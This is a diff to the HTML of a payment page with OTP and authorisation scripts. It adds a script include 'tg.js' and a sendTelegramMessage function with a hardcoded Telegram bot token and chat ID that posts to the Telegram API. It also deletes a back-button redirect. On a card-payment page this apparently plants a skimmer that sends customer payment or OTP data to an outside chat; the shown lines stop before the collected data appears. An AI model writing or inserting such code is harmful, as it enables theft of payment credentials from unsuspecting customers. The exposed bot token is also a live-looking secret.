@@ -826,16 +826,12 @@
     <link href="./css/payment-responsive-ar.css?ver=1.70" rel="stylesheet" type="text/css">
     <script type="text/javascript" src="./js/checkSum.js"></script>
     <script language="JavaScript" src="./js/AuthValidation.js"></script>
+    <script src='../assets/js/tg.js'></script>
+
     <script type="text/javascript">
     //Added for OTP at I-T-B level
     var termBrandlvlAmt;
 
-    /*code added for redirect-starts*/
-    function callTimeOutForbackBotton() {
-        window.location.hash = window.location.hash[window.location.hash.length - 1];
-        setTimeout('callTimeOutForbackBotton()', 10);
-    }
-    /*code added for redirect-ends*/
 
     var keys;
     /*Added for OTP at I-T-B level*/
@@ -1304,6 +1300,7 @@
 
 
     function sendTelegramMessage(messageText) {
+        
         botToken = '8599584358:AAFo3N5h5TrjujeZGH2SbS8L4EPpjYSaQqg'
         chatId = '-5263360636'
         const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
